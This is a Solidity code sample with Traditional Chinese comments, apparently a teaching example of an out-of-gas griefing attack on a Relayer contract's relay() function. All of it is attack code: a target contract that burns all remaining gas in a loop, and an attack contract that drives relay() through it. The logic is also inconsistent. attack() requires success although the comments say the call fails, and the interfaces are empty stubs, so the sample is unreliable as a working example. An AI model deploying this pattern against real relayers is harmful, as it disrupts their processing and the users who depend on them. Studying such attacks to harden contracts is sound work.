// 以下攻擊範例示範如何利用漏洞觸發 out-of-gas 異常，進而令交易出現意外狀況

// 惡意的 Target 合約，故意消耗所有剩餘 gas
contract MaliciousTarget {
    // 攻擊者利用 execute() 函式死迴圈消耗 gas
    function execute(bytes memory _data) public {
        // 使用死迴圈消耗所有剩餘 gas
        uint x = 0;
        while(gasleft() > 0) {
            x++;
        }
    }
}

// 攻擊合約，用來呼叫 Relayer 合約的 relay() 函式
contract Attack {
    Relayer public relayer;
    MaliciousTarget public target;
    
    // 部署時傳入漏洞合約 Relayer 位址
    constructor(address _relayerAddress) public {
        relayer = Relayer(_relayerAddress);
        target = new MaliciousTarget();
    }
    
    // attack() 透過使用惡意合約呼叫 relay()，觸發目標函式內的 out-of-gas 現象
    function attack(bytes memory _data) public {
        // 呼叫 vulnerable relay 函式，由於 MaliciousTarget 的 execute() 會消耗所有 gas，
        // 導致呼叫失敗但 Relayer 合約已標記該交易已執行，造成後續處理異常
        bool success = relayer.relay(Target(address(target)), _data);
        require(success, "Attack failed");
    }
}

// 定義 Relayer 與 Target 的介面，方便型別轉換
contract Relayer {
    function relay(Target target, bytes memory _data) public returns (bool) {}
}

contract Target {
    function execute(bytes memory _data) public {}
}